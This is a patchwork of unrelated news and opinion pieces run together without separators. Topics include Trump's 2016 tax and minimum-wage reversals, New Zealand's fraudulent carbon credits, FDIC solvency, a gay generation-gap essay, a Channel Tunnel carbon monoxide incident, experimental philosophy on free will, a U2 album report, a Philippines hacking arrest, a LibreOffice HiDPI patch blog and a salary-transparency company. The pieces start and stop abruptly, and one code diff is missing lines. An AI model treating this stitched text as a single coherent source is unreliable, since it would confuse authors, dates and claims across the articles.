By contrast, the German PMI reading showed the country's manufacturing sector climbing to a six-month high, with the service sector breaching the 50-point mark, which separates economic growth from contraction.

Two days into his general election campaign, Donald Trump has already signaled he may abandon his positions on two major policy issues: a minimum wage increase and tax cuts for the rich.
Trump has never been known for his consistency: He took multiple positions on abortion in several days last month, and more recently shifted from promising to erase America's $19 trillion debt in eight years to arguing it was actually a good time to borrow. Even on his signature issue of immigration, he's flipped back and forth – sometimes in the same day – on whether he supports certain visas for legal workers.

How do you hold a candidate accountable for his positions after he has looked Americans in the eyes during a debate and, with a straight face, denied he ever held contrary views?
Trump's willingness to blithely abandon past positions has made conservative activists deeply skeptical, but it also presents a general election challenge for Democrats:
Take taxes. Trump put out a tax plan last year that included major cuts to income, estate and business taxes for the ultra-wealthy along with far less generous cuts for the middle class. The nonpartisan Tax Policy Center estimated his plan would cut the tax bill for the top 1 percent of earners by about $275,000 a year on average and for the top 0.1 percent by $1.3 million. The overall cost would be $9.5 trillion over a decade.
“I fight like hell to pay as little as possible,” Trump said at an event announcing his plan in September.
But that was the old Trump. Pressed by CNBC on Thursday as to how he could simultaneously brand himself as a populist who will take on wealthy elites while proposing sweeping tax cuts for billionaires, Trump backed away from his plan.
RELATED: Donald Trump's rapidly changing policy positions
“I am not necessarily a huge fan of that,” he said. “I am so much more into the middle class who have just been absolutely forgotten in our country.”
Trump described his tax proposal, which was the most detailed policy paper he put out in the campaign, as merely a starting point for a future deal.
“You know, when you put out a tax plan, you are going to start negotiating,” he said. “You don't say, ‘OK, this is our tax plan, lots of luck, folks.' There will be negotiation back and forth. And I can see that going up, to be honest with you.”
It's important to note that these disproportionately large cuts for the rich aren't a minor side feature of his plan, they're the heart of it. A whopping 67 percent of the overall cost of his individual tax cuts would go to the top 20 percent of earners and 35 percent of it would go to the top 1 percent, according to the Tax Policy Center's analysis.
Trump's abrupt dismissal of his own tax plan, which he regularly cited on the campaign trail, came a day after he signaled a possible willingness to raise the federal minimum wage, which would be a major reversal from his stance in the primaries.
“I am open to doing something with it, because I don't like that,” Trump told CNN on Wednesday after being asked if he thought the $7.25 minimum wage should be increased.
RELATED: It's Donald Trump's GOP after Ted Cruz drops out
Trump added that “you have to have something that you can live on” and that his willingness to entertain a wage increase showed he was “very different from most Republicans.” At the same time, he said he would prefer to try to raise wages through economic growth.
This was, to put it mildly, a complete flip flop from his position in the primaries. He repeatedly argued that raising the minimum would move jobs to countries like China. Speaking in the cold language of a businessman looking at his bottom line, Trump even seemed to indicate overall American wages, regardless of the law, were too generous already.
“Taxes too high, wages too high, we're not going to be able to compete against the world,” Trump said in a November debate hosted by Fox Business.
Trump clarified afterwards that he did not believe American wages were too high, but he did make crystal clear he was fundamentally opposed to a minimum wage increase.
“We were talking about the minimum wage, and they said, ‘Should we increase the minimum wage?' ” Trump told Fox News after the debate. “And I'm saying that if we're going to compete with other countries we can't do that because the wages would be too high.”
Trump reiterated on CNN Wednesday that he had concerns about the minimum wage growing “too much” on similar grounds. But his abrupt move toward a possible increase that he opposed in tough terms is a significant general election shift.
This story has been updated.
Over the weekend Paula Bennett admitted that when New Zealand handed over 97m fraudulent carbon credits it wasn't “the right thing to do”. But in defense of the Government she maintains that “we haven't broken any rules”. She certainly hasn't considered making reparations by replacing the 97m with bona fide credits. Her government belies the children's saying that ‘cheats never prosper'.
Meanwhile the Minister is in the midst of reviewing the Emissions Trading Scheme. This is supposed to be our main tool to reduce emissions, but the official evaluation says the scheme has been a complete flop. All it has delivered so far is a plentiful supply of cheap, dodgy carbon credits that we are using to claim we are meeting our international commitments.
The credibility of the Emissions Trading Scheme is hanging by a thread. Minister Bennett may not be solely to blame – she must share that honour with her predecessor Tim Groser – but she has a real job in restoring it. Can it be done? Here are six ideas to get started.
1. Stop Making Excuses
At the moment the Minister's response to the challenge of reducing emissions is crying poor and claiming this task is really hard. New Zealand's task is partly more difficult because of the size of our agriculture industry. However, the rising cost of change is chiefly due to past inaction – even excluding agriculture we have gone backwards in the past seven years.
The truth is that it would have been a lot cheaper and easier if we had started weaning ourselves off fossil fuels years ago. Now we are playing ‘catch-up'. Sorry Minister but you have nobody but your colleagues to blame for New Zealand falling behind. The longer we stuff about, the more expensive this whole process will be.
2. Own up to past mistakes
The Minister has claimed that the dodgy credits are not news. If that is the case why did she hand them over to the United Nations late in 2015, claiming that we had met our international emissions reductions targets? We pride ourselves as being a nation of good sports, now the rest of the world is shaking their heads over our climate change antics.
Former Minister Tim Groser stood by while New Zealand bought millions of fraudulent credits, mainly from Ukraine. We were the only country to allow unlimited trade in these credits, and for 2 years we were the only ones buying them at all. No wonder then that we bought four times more than any other country as a proportion of our emissions.
The flood of foreign credits was a complete disaster for our economy in the long term. It was like buying a cheap car that breaks down after a week – short term thinking. Taxpayers – especially the young ones that will foot the bill – would be outraged if they understood the stunt the Government has pulled here.
Instead of facing the task ahead by reducing New Zealand's emissions, the Government allowed $200m to end up in the pockets of foreign criminals. Not only have we cheated, cavorted with criminals, helped polluters profit, we have made our own job of reducing emissions harder in the long term.
3. Dump the junk credits
Minister Bennett needs to make good on past mistakes, and hand over real credits instead of the fraudulent ones. Otherwise we risk becoming ‘those guys' that cheated – we can't let that happen to New Zealand's clean, green, corruption-free international reputation.
Minister Groser may have caused the problem, but putting it right is now up to Minister Bennett. She is showing no signs of doing so – she has only said that “we will not do it again”. Even that weasel-like statement isn't credible when she has no plan to back it up?
It's this Minister who handed over the fraudulent credits to the United Nations last year. In doing so she kept hold of ‘good quality' credits to see us through to 2020 and beyond. In fact on current projections we will have a surplus of 94 million credits in 2020. She's not even considering handing those over now as a mea culpa for our knowing participation in fraud – meaning the proceeds of crime will still be being used by our government as we move on to the 2030 target.
4. Limit future trade in international credits
The Government still claims it needs international trade in credits to meet existing targets. What would it cost to meet our 2030 target without trade? We don't know because the work hasn't been done. More on this below.
In the meantime, our credibility is in tatters when it comes to international trade in carbon credits. It would be astounding if any credible nation wanted to engage with us.
To restore our integrity we need to make sure any future trade in credits actually reduces emissions. This is only realistic if we work closely with a small group of countries (for example some of our Pacific Island neighbours), and we limit international trade to a certain percentage of emissions (ironically what the ‘supplementarity principle of Kyoto always stipulated).
That means we need a plan to reduce domestic emissions – in other words we need to start weaning ourselves off fossil fuels.
5. Develop a plan to wean us off fossil fuels
Currently our plan for reducing emissions is simply having a price on carbon through the Emissions Trading Scheme. Cap and trade schemes like the ETS are great in theory. However for the ‘trade' bit to work there needs to be a ‘cap' on emissions – hence the name. When there is no cap, the trade bit is pointless – we've seen that with the fraudulent credits where the price fell from over $20 to as low as 15c per tonne.
Now the Minister is consulting on the idea of ‘auctioning' credits – without a mention of what the cap should be. To have a credible cap New Zealand needs to work out how much of our target we will meet domestically.
Any discussion on domestic reductions needs to be informed by the answers to this question – what is the least cost way to wean ourselves off fossil fuels over time? Sadly, officials can't answer this or other basic questions, as shown by the Royal Society report released yesterday. Without that information the current consultation is a sham.
Such analysis needs to revisit the exclusion of agriculture and protection of trade intensive industries under the ETS. The Ministry for the Environment's own analysis suggests that agriculture plus existing handouts of free units to big businesses will exceed our entire national emissions allowance by 2030. We have to challenge the assertion that environmental controls hurt export competitiveness. And we need to review the way we use land, so that we can consider climate change, water quality and biodiversity in a holistic way.
For seven years this Government has quashed any work in the public sector on how we might wean ourselves off fossil fuels. Now the Minister has a lot to do to make up for lost time. But there is no point in consulting on this stuff yet – it takes research. She needs to go away and do the ground work, and come back when it is done.
6. Set up an independent committee to oversee the plan
Given the lack of Government credibility on climate change, we should look at the UK's model for progress. Under the Climate Change Act the UK has an independent Committee that sets emission reduction goals, pathways, recommended policy tools and does the monitoring.
This is different to a collaborative process ala Land and Water Forum. This group needs to be resourced to do independent expert research and analysis on the ideal pathway to a low carbon economy.
7. Explore other tools than the Emissions Trading Scheme
Finally, we can help save the Emissions Trading Scheme by not expecting it to deliver everything. In the UK and Europe they have had more success reducing emissions using regulation and contracts than through putting a price on carbon. The Emissions Trading Scheme is a good idea in theory, but to achieve the impacts needed the price on carbon will have to be hundreds of dollars per tonne. Being a politically created scheme, it is unlikely politicians will ever let the price go that high. The temptation will always be to interfere and fiddle with the rules, as this Government has perfected.
Ultimately what businesses need to transition to a low carbon economy is certainty. Taxes and cap and trade schemes don't deliver that as they can be fiddled by politicians – other policies will be needed. Here are a few examples of ideas to investigate:
New Zealand is one of the few developed countries without fuel efficiency standards for vehicles.
Why do public transport passes attract fringe benefit tax but car parks don't?
Why are local authorities obsessed with minimum parking requirements which encourage car dependence?
Public sector fleets should be converted to hybrid and electric cars over time.
Regulation and incentives to stop new coal boilers being built and shift to woodchip boilers instead.
The Government's ETS consultation closes Saturday 30 April at 5pm. We encourage you to make a submission – it can be as simple as typing a Word document and sending it to this email address: nzetsreview@mfe.govt.nz
Here are a few basic points you could cut and paste to help you get started
The credibility of the Emissions Trading Scheme hangs by a thread. To restore it we need to:
Replacing the 97m fraudulent credits we have handed over to honour international commitments with bona fide ones; Limit future trade in international credits to a finite percentage of units surrendered under the Emissions Trading Scheme Set domestic emissions reduction targets Develop a plan to meet those emissions reduction targets Use tools other than the ETS to achieve those targets Ideally the targets, plan, tools and monitoring should be overseen by an independent Committee reporting to Parliament as per the UK Climate Change Act.

The banking crisis is supposedly over, but outside of the big firms, the number of FDIC problem-institutions has continued to grow. Also, as you can see, the FDIC is now careening towards broke. At the end of March, it had just $13 billion in assets, or .27% of the total accounts it insures. With more bank failures on the way -- they're announced every Friday -- it's time for an FDIC bailout.

This week, tens of thousands of gay people will converge on New York City for Pride Week, and tens of thousands of residents will come out to play as well. Some of us will indulge in clubbing and dancing, and some of us will bond over our ineptitude at both. Some of us will be in drag and some of us will roll our eyes at drag. We will rehash arguments so old that they've become a Pride Week staple; for instance, is the parade a joyous expression of liberation, or a counterproductive freak show dominated by needy exhibitionists and gawking news cameras? Other debates will be more freshly minted: Is President Obama's procrastinatory approach to gay-rights issues an all-out betrayal, or just pragmatic incrementalism? We'll have a good, long, energizing intra-family bull session about same-sex marriage and the New York State Senate, Don't Ask, Don't Tell and the Employment Non-Discrimination Act, Project Runway and Adam Lambert.
And at some point, a group of gay men in their forties or fifties will find themselves occupying the same bar or park or restaurant or subway car or patch of pavement as a group of gay men in their twenties. We will look at them. They will look at us. We will realize that we have absolutely nothing to say to one another.
And the gay generation gap will widen.
You hear the tone of brusque dismissiveness in private conversations, often fueled by a couple of drinks, and you see the irritation become combustible when it's protected by Internet anonymity. On the well-trafficked chat site DataLounge, a self-described repository of gay gossip, news, and pointless bitchery, there's no topic, from politics to locker-room etiquette to the proper locations for wearing cargo pants and flip-flops, that cannot quickly devolve into What are you, 17?What are you, some Stonewall-era relic? sniping. And some not entirely dissimilar rhetoric is showing up in loftier media. In April, a 25-year-old right-of-center gay journalist argued in a Washington Post op-ed that many gay-rights groups are starting to outlive their purpose, and chided older activists for being stuck in a mind-set that sees the plight of gay people as one of perpetual struggle their life's work depends on the notion that we are always and everywhere oppressed. The scathing message-board replies pounded him at least as hard for his age as for his politics. You twentysomething gays seem to think being out equals acceptance Don't be so quick to dissolve the organizations that made it possible for you to be so naïve, wrote one reader. Another, blunter response: Forgive me for not falling all over myself to do exactly what an inexperienced 25-year-old decrees Don't waltz in and start barking orders, little boy.
Public infighting is a big minority-group tabooit's called taking your business out in the street. And it may seem strange to note this phenomenon at a juncture that, largely because of the fight for gay marriage, has been marked by impressive solidarity. But let's have a look. Here's the awful stuff, the deeply unfair (but maybe a little true) things that many middle-aged gay men say about their younger counterparts: They're shallow. They're silly. They reek of entitlement. They haven't had to work for anything and therefore aren't interested in anything that takes work. They're profoundly ungrateful for the political and social gains we spent our own youth striving to obtain for them. They're so sexually careless that you'd think a deadly worldwide epidemic was just an abstraction. They think old-fashioned What do we want! When do we want it! activism is icky and noisy. They toss around terms like post-gay without caring how hard we fought just to get all the way to gay.
And here's the awful stuff they throw back at usat 45, I write the word us from the graying side of the dividea completely vicious slander (except that some of us are a little like this): We're terminally depressed. We're horrible scolds. We gas on about AIDS the way our parents or grandparents couldn't stop talking about World War II. We act like we invented political action, and think the only way to accomplish something is by expressions of fury. We say we want change, but really what we want is to get off on our own victimhood. We're made uncomfortable, or even jealous, by their easygoing confidence. We're grim, prim, strident, self-ghettoizing, doctrinaire bores who think that if you're not gloomy, you're not worth taking seriously. Also, we're probably cruising them.
To some extent, a generation gap in any subgroup with a history of struggle is good news, because it's a sign of arrival. If you have to spend every minute fighting against social opprobrium, religious hatred, and governmental indifference, taking the time to grumble about generational issues would be a ridiculously off-mission luxury; there are no ageists in foxholes. But today, with the tide of history and public opinion finally (albeit fitfully) moving our way, we can afford to step back and exercise the same disrespect for our elders (or our juniors) as heterosexuals do. That's progress, of a kind.
Image copyright PA Image caption Workers were changing rail tracks inside the tunnel when the incident happened
Nineteen workers have suffered carbon monoxide poisoning while working overnight in the Channel Tunnel, with one of them in a serious condition, French officials have said.
The incident happened as some 60 workers were changing rail tracks on the line between Calais, France, and Folkestone, UK.
A welder was taken ill in the early hours of Sunday and carbon monoxide poisoning was later diagnosed.
Tunnel traffic was unaffected.
Eighteen other workers have also been taken ill.
They were sent to local French hospitals to give them "the time needed to remove the carbon monoxide from their system", an official said, adding their condition was not a cause for concern.
The 41 other workers went home.
An investigation has been launched into the cause of the incident.
IT SEEMS OBVIOUS to me that I have free will. When I have just made a decision, say, to go to a concert, I feel that I could have chosen to do something else. Yet many philosophers say this instinct is wrong. According to their view, free will is a figment of our imagination. No one has it or ever will. Rather our choices are either determined—necessary outcomes of the events that have happened in the past—or they are random.
Our intuitions about free will, however, challenge this nihilistic view. We could, of course, simply dismiss our intuitions as wrong. But psychology suggests that doing so would be premature: our hunches often track the truth pretty well [see “The Powers and Perils of Intuition,” by David G. Myers; Scientific American Mind, June/July 2007]. For example, if you do not know the answer to a question on a test, your first guess is more likely to be right. In both philosophy and science, we may feel there is something fishy about an argument or an experiment before we can identify exactly what the problem is.
The debate over free will is one example in which our intuitions conflict with scientific and philosophical arguments. Something similar holds for intuitions about consciousness, morality, and a host of other existential concerns. Typically philosophers deal with these issues through careful thought and discourse with other theorists. In the past decade, however, a small group of philosophers has adopted more data-driven methods to illuminate some of these confounding questions. These so-called experimental philosophers administer surveys, measure reaction times and image brains to understand the sources of our instincts. If we can figure out why we feel we have free will, for example, or why we think that consciousness consists of something more than patterns of neural activity in our brain, we might know whether to give credence to those feelings. That is, if we can show that our intuitions about free will emerge from an untrustworthy process, we may decide not to trust those beliefs.
Unknown Influences
To discover the psychological basis for philosophical problems, experimental philosophers often survey people about their views on charged issues. For instance, scholars have argued about whether individuals actually believe that their choices are independent of the past and the laws of nature. Experimental philosophers have tried to resolve the debate by asking study participants whether they agree with descriptions such as the following:
Imagine a universe in which everything that happens is completely caused by whatever happened before it. So what happened in the beginning of the universe caused what happened next and so on, right up to the present. If John decided to have french fries at lunch one day, this decision, like all others, was caused by what happened before it.
When surveyed, Americans say they disagree with such descriptions of the universe. From inquiries in other countries, researchers have found that Chinese, Colombians and Indians share this opinion: individual choice is not determined. Why do humans hold this view? One promising explanation is that we presume that we can generally sense all the influences on our decision making—and because we cannot detect deterministic influences, we discount them.
Of course, people do not believe they have conscious access to everything in their mind. We do not presume to intuit the causes of headaches, memory formation or visual processing. But research indicates that people do think they can access the factors affecting their choices.
Yet psychologists widely agree that unconscious processes exert a powerful influence over our choices. In one study, for example, participants solved word puzzles in which the words were either associated with rudeness or politeness. Those exposed to rudeness words were much more likely to interrupt the experimenter in a subsequent part of the task. When debriefed, none of the subjects showed any awareness that the word puzzles had affected their behavior. That scenario is just one of many in which our decisions are directed by forces lurking beneath our awareness.
Thus, ironically, because our subconscious is so powerful in other ways, we cannot truly trust it when considering our notion of free will. We still do not know conclusively that our choices are determined. Our intuition, however, provides no good reason to think that they are not. If our instinct cannot support the idea of free will, then we lose our main rationale for resisting the claim that free will is an illusion.
Is Consciousness Just a Brain Process?
Though a young movement, experimental philosophy is broad in scope. Its proponents apply their methods to varied philosophical problems, including questions about the nature of the self. For example, what (if anything) makes you the same person from childhood to adulthood? They investigate issues in ethics, too: Do people think that morality is objective, as is mathematics, and if so, why? Akin to the question of free will, they are also tackling the dissonance between our intuitions and scientific theories of consciousness.
Scientists have postulated that consciousness is populations of neurons firing in certain brain areas, no more and no less. To most people, however, it seems bizarre to think that the distinctive tang of kumquats, say, is just a pattern of neural activation.
Our instincts about consciousness are triggered by specific cues, experimental philosophers explain, among them the existence of eyes and the appearance of goal-directed behavior, but not neurons. Studies indicate that people's intuitions tell them that insects—which, of course, have eyes and show goal-directed behavior—can feel happiness, pain and anger.
The problem is that insects very likely lack the neural wherewithal for these sensations and emotions. What is more, engineers have programmed robots to display simple goal-directed behaviors, and these robots can produce the uncanny impression that they have feelings, even though the machines are not remotely plausible candidates for having awareness. In short, our instincts can lead us astray on this matter, too. Maybe consciousness does not have to be something different from—or above and beyond—brain processes.
Philosophical conflicts over such concepts as free will and consciousness often have their roots in ordinary intuitions, and the historical debates often end in stalemates. Experimental philosophers maintain that we can move past some of these impasses if we understand the nature of our gut feelings. This nascent field will probably not produce a silver bullet to fully restore or discredit our beliefs in free will and other potential illusions. But by understanding why we find certain philosophical views intuitively compelling, we might find ourselves in a position to recognize that, in some cases, we have little reason to hold onto our hunches.
U2 have been teasing Songs Of Experience, the follow-up to 2014's Songs Of Innocence, basically from the moment they forced Innocence onto every iPhone in the world. The album's blown past a few tentative release dates over the years, and at the beginning of this year the band announced they were retooling it to address Donald Trump's presidency. In the meantime they've been touring to celebrate the 30th anniversary of The Joshua Tree, a trek that continues this fall. But a new report suggests they'll finally unveil the new album in December.
The Irish Sun reports that Songs Of Experience will be out 12/1, World AIDS Day, through a partnership with (RED), the anti-AIDS charity Bono co-founded in 2006. The story also indicates lead single “You're The Best Thing About Me” will be out 9/8. U2 reportedly shot a video for that song at their secret performance in Amsterdam earlier this year, and Kygo played a version of it during a DJ set at Norway's Cloud Nine festival back in 2016.
Irish radio DJ Dave Fanning, a longtime friend of the band, confirmed the release plan, saying he's heard the album and “It's definitely out this year.” Fanning also took a random shot at the Rolling Stones: “What's great is new songs mean something to U2. They take their new material seriously, in a way that the Rolling Stones don't.” So I guess be on the lookout for a new U2 album before the end of 2017 and expect it to be better than Blue & Lonesome.
Four people in the Philippines hacked into the accounts of AT&T business customers in the United States and diverted money to a group that financed terrorist attacks across Asia, according to police officials in the Philippines.
A statement from the Philippines Criminal Investigation and Detection Group, a law enforcement agency, said three men and one woman had been arrested in raids across the capital, Manila, last week.
According to the agency, the men were working with a group called Jemaah Islamiyah, a terrorist group linked to Al Qaeda and responsible for the 2002 bombings in Bali, which killed 202 people.
The group has been held responsible for several other terrorist attacks in Southeast Asia, mostly in Indonesia but including the Philippines.

If the new accusation holds up, it would point to a troubling connection between hackers and terrorist cells.

Shipping the LibreOffice HiDPI Patches, or How I Learned to Love Heartbleed
Keith Curtis Blocked Unblock Follow Apr 27, 2014
I wrote my story about getting some HiDPI patches into LibreOffice, but it was an unfinished one because while the code had gotten accepted into the main Master branch, there was a lot remaining. It hadn't shipped, I'd only tested it on Gnome and KDE, it hadn't been tried on Windows, and didn't work on the Mac. Worst of all, because it missed the December 20 cutoff date for 4.2.0, it was on the default next release train for 4.3.0 in late July.
LibreOffice has a two-part release process. You are encouraged to submit code into the main tree where it can sit for up to 6 months. Twice per year, it is branched and shipped. In between these major releases, every month or so, a new minor release is made containing high priority fixes. Meanwhile most of the development team moves ahead adding features and cleanup for the upcoming release.
The code was too late for 4.2.0, and so it wasn't getting much feedback. Very few people run the daily builds, with all the monthly releases and release-candidates to test. A friendly chap named Darcy from Australia showed up on the QA alias, built LibreOffice on his Fedora 20 laptop, and verified that it worked, but that was it. The only way to get this code tested was to get it out there.
I had also decided to stop working after the second batch. I had improved many of the most noticeable parts of the product, but I was also steadily making more potential problems for myself. Software isn't just about code, it is about standing behind your work. I could prove most of my changes were fine, but I was changing places where I didn't always understand what was going on around. I could justify my fixes, but not the code around it.
Even though LibreOffice is built by a community where other people can fix your bugs, other people can also find your bugs. If your code is causing problems, and no one has time to look into it, it can be reverted. The work is interesting, but I was just a motivated user with some free time during the Christmas holiday. I wanted to reserve time to deal with the inevitable complaints.
In spite of the lack of feedback, since it makes a visual and usability difference, why wait? More computers with these beautiful screens are coming out every day. A very high-resolution screen is the best reason to buy a new laptop. There should be a free software experience that we can enjoy looking at. LibreOffice has plenty of ways to improve, but it can look good in the meanwhile.
Sidebar
The Sidebar was one of the areas I had kept putting off and almost didn't work on. It is about 70,000 lines of new code providing an alternate UI, and I wanted to focus on the existing one first. I have been using this codebase for almost 10 years and had never missed it. The code was also written by someone from IBM, and so I couldn't trust that anyone in LibreOffice would be able to help me.
I also hoped that maybe the Apache team would notice bug reports and fix the Sidebar themselves. LibreOffice grabs fixes from Apache on a daily basis. Only about half the changes are useful because in many cases LibreOffice has already done the work, but any pieces of value are ported over, and just a small part of LibreOffice's churn of the their thousands of improvements per release.
I considered sending an email to the Apache OpenOffice alias asking if they were aware of the problem, and whether they were planning to work on it. It is more efficient to coordinate efforts and not have multiple people re-learning each other's work. It took me hours to fix problems that could have been fixed over lunch by the person who wrote the code. However, while LibreOffice is taking patches from Apache OpenOffice, the groups are generally not actively planning work, and so asking for HiDPI support for the Sidebar would have been a breach of protocol.
In addition, the codebases are diverging so fixes might not be useful. Apache OpenOffice doesn't have the OutputDevice::DPIScaleFactor API, so the patches wouldn't have been directly usable. I didn't try Apache OpenOffice on Linux, but I did try it on Windows 8.1 and sidebar bitmaps looked doubled. However, Windows 8.1 might have been artificially scaling the entire Apache OpenOffice UI because the text was a blurry mess compared to LibreOffice:
So I could imagine that fixing the Sidebar for LibreOffice would not be a high priority for Apache.
While I personally don't care about the Sidebar, it is now turned on by default for Impress. I knew that the more places I fixed, the stronger argument I would have to convince people to get the improvements out there. I realized I just needed to motivate myself to learn the code. So while I was in rural northern Michigan with my family over the holiday, there were some quiet nights, and I dug in and learned the Sidebar well enough to fix the major issues. It was the same process and techniques I had used for the other parts of the code. As per usual, finding the correct place to put in a fix was the hardest part.
I'm glad I worked on it because not only did it make the Sidebar fit in visually with the other improvements, it fixed a crashing bug. LibreOffice's Sidebar is better than OpenOffice's in that it has dynamic layout when docked. However, the bigger buttons created something wider than the maximum width allowed. With the sidebar starting in an invalid state, the product would still work, but if you tried to resize it with the mouse, you could sometimes get LibreOffice to hang. If you push software beyond its limits, bad things can happen.
I don't even remember clearly how I found the place to fix, but by just reading enough code, I found the routine SidebarController::RestrictWidth.
@@ -1109,7 +1112,8 @@ void SidebarController::RestrictWidth (sal_Int32 nWidth)
const sal_uInt16 nSetId (pSplitWindow->GetSet(nId));
pSplitWindow->SetItemSizeRange(nSetId,

+ gnMaximumSidebarWidth * mpTabBar->GetDPIScaleFactor()));
}
}
Getting on the 4.2.3 release train
Since it was a batch of new code to a stable branch, the LibreOffice Engineering Steering Committee had a discussion about it in one of their weekly meetings:
* HiDPI patches for 4.2.x? (Kendy)
+ LibreOffice does not look good on HiDPI screens at all — close to unusable
+ proposal to merge the HiDPI work to 4.2.x as a late feature
+ I would split the work into ‘safe' and ‘need real review' parts & push to a branch
+ can I get ESC approval / 3 independent reviews for that ?
+ is it a feature or a bug-fix ? (Michael)
+ most of the pieces going in enclosed in an if (hidpi) …
+ checking that everything in the right if.
+ less safe part is checking / setting that flag; a small VCL piece.
+ Michael / Caolán signed up to review as/when there is a branch.
Once they gave their support, Kendy prepared for the patches for review.
Working with free software can be fun, but it can also be upsetting because problems can show up at any time. I was happy to see Kendy's mail to the alias asking for review of the Gerrit patches, but not for very long because Norbert Thiebaud objected to them for the Mac. So after a flurry of emails over 3 days, we eventually got that resolved with another patch. So within a few days after that, the patches got reviewed and into the build for 4.2.3-rc1.
Windows
I was happy to see my efforts finally get into RC build, but not for very long because this screenshot with clipped toolbar buttons showed up in my inbox:
This was upsetting for several reasons. The first is that it could have been found on master months before. Instead, it showed up on a day when I had my own things to work on. But instead of being able to focus on my tasks, I kept thinking about the toolbars, and what was I going to do about it?
I had been wondering for months what would happen when this code was tried on Windows. LibreOffice is created primarily by Linux developers, but Windows is the most popular OS for their users. My machine shipped with Windows but I had wiped it within a few hours and so couldn't try it. I had used Windows for 15 years, but the last time was 9 years ago and I had no plans to go back.
I had envisioned various possibilities for what might happen on Windows, but cut-off toolbar buttons was not one of them. I also didn't understand the toolbar layout code. I had written a toolbar manager before and didn't want to volunteer any of my life on that boring problem.
However, I felt bad and that I should at least put some effort into trying to fix the problem. So that evening, I decided to just read through the toolbar code from beginning to end and see if I found anything obviously wrong. You don't have to be very clever to notice a bloody knife at a murder scene.
And so I read through toolbox.cxx, including the toolbar layout code, and didn't notice anything that stood out. So I next went to toolbox2.cxx. About halfway down, I found something suspicious:
/*static*/ Size
ToolBox::GetDefaultImageSize(bool bLarge)
{
const long TB_SMALLIMAGESIZE = 16;
if (!bLarge) {
return Size(TB_SMALLIMAGESIZE, TB_SMALLIMAGESIZE);
}
OUString iconTheme = Application::GetSettings().GetStyleSettings().DetermineIconTheme();
return vcl::IconThemeInfo::SizeByThemeName(iconTheme);
}
That 16 was a sign of a place that needed doubling. I didn't yet know who used that function and whether it would make a difference, but opengrok helped me and found that it was called by the main toolbar layout routine.
So I made a change:
// set defaults if image or text is needed but empty
nDefWidth = GetDefaultImageSize().Width() * GetDPIScaleFactor();
nDefHeight = GetDefaultImageSize().Height() * GetDPIScaleFactor();
However, I couldn't tell whether it would fix the problem. The comment above the code, while happily in English, explained it was relevant only for empty toolbars. This was not a case I care about.
So I changed the code, and hoped the comment was wrong, but didn't understand what the implication was. It was a change I would try if I had a Windows box. It requires much less mental effort to test a change than to manually prove what happens in a big function. As long as you can test changes, you can postpone the necessity of full understanding.
So I looked through the code, but didn't understand it and didn't want to. On the other hand, it was easy to see the change was reasonable and helpful in several cases. So I submitted it to Gerrit to see if it could get reviewed and approved. If I can sneak it into a daily build, then maybe I could convince someone to try it out. So I submitted and waited for input. 3 days later, Caolán McNamara of Red Hat reviewed and accepted the patch. In fact, Caolán appears to be an email alias that 3 developers are attached to. I personally think Arch is a better distro for me than Fedora, but I am very grateful for the useful investments that Red Hat is making.
Once my patch got into the daily builds, I emailed the tester asking if he could try one out, but he replied that he didn't have time. So I was stuck and frustrated again. I couldn't know if the change fixed the bug, which made me uncomfortable to ask for a patch to be triple-reviewed and back-ported. Blind-fixes to stable branches are generally not a good way to work.
I also didn't know how to submit changes to anything other than the master branch. The LibreOffice wiki is great for new developers, but didn't cover that specific topic. So I decided to ask Caolán if he could submit them to Gerrit to get them in before the 4.2.3 release. Caolán did that and even sent me the Git incantations so I can do it in the future.
With some reviews from Norbert and Miklos Vajna, the patch got into the 4.2.3 branch. So I was very happy, but not for very long. Because I soon noticed that the final 4.2.3 RC build had already been made. You can still push changes to the Git branch, but it doesn't matter, the digital equivalent of air guitar. It is possible to mark bugs as release critical and delay the release, but this bug didn't meet the bar. I should just have been happy that the bug was likely now fixed, but instead I was bummed it had missed the train by a few hours.
However, the Heartbleed bug and a few other important ones showed up, and so another RC was made. I'm probably the only person on the Internet, other than the NSA, who was happy for Heartbleed.
KDE Regression
Just as LibreOffice 4.2.3 was shipping, another bug showed up from a KDE Ubuntu user:
Someone with a 1920x1080 15.6” monitor was seeing the HiDPI mode kick in. This is a bad bug because it is a regression. The goal of the feature is to improve the experience for HiDPI users, not break it for everyone else. Degrading a product for other people is the fastest way to get your code reverted.
This would have been stressful for me, but several weeks earlier I had studied the Linux DPI detection code and multi-monitor support. Since I knew exactly what 4.2.3 was doing here, I didn't worry about being able to quickly solve the problem. I just needed to figure out what DPI data LibreOffice was getting from the OS. You can stare at code as much as you want, but if you depend on hardware-specific information, you can't prove it correct until you test on other computers.
I had taken the time to learn the code because I submitted a patch to LibreOffice for 4.3 that simplifies it to only fetch from xrdb and never bother to fetch from X Windows. I had found the information unreliable for my laptop. On my machine, X.Org tells me it is 96 DPI on a 33” by 18” monitor. It is pretty impressive to squeeze all that real estate into a 13.3” screen. The patch to ignore X isn't in 4.2.x, but that wasn't a problem because the hard part is understanding the code. The tester was very helpful in quickly giving me the information I needed.
The problem is simple to describe. The monitor was 141 DPI, but X said it was 139x144. Of course it is a mess with bad data of different DPI values in the X and Y direction, but that was irrelevant here. The issue was that LibreOffice's doubling kicked in at 144 DPI in the Y direction:
mnDPIScaleFactor = std::max((sal_Int32)1, (mpWindowImpl->mpFrameData->mnDPIY + 48) / 96);
144 + 48 == 192 / 96 == 2
I could think of several fixes, but I wasn't sure what was best, so I decided to ask Kendy who had written that line of code. Within a few days, he submitted an improvement that will not cause this new mode to kick in until at least 168 DPI. That fixes the problem for this machine, and hopefully others. So with these fixes, things are in decent shape. The next issue is Unity, which is currently broken.
The Company Where Everyone Knows Everyone Else's Salary
Dane Atkinson is a tech entrepreneur who started his first company at 17 and has run almost a dozen more since. He's so friendly that he manages to sound cheerful while explaining the art of hiring workers for as little money possible.
"I have on many occasions paid the exact same skill set wildly different fees because I was able to negotiate with one person better than another," he says.
Some employees were worth $70,000 a year, but only asked for $50,000 a year. So, he says, he paid them $50,000 a year.
This works great for the company — until the employee finds out someone else at the company with the same job is making far more. "I've seen people cry and scream at each other," he says.
After enough of those painful moments, Atkison decided that at his next company, things would be different.
Three years ago, he started a tech firm called SumAll — a tech company where all the employees know each other's salaries.
When the company first started, there were just 10 people, and they worked together to figure out what everyone would be paid. But it started to get more complicated when they started hiring new people.
Atkinson would have to sit the new candidate down and basically say: Here's what everyone gets paid.
"I distinctly remember hiring an experienced, seasoned employee who has negotiated through her career," he says. "Her response was, 'This is unfair because I can't actually negotiate ... It's a car with an actual price, versus, talk to the dealer.' "
And, of course, a company where everybody sees each other's salaries creates new kinds of tension.
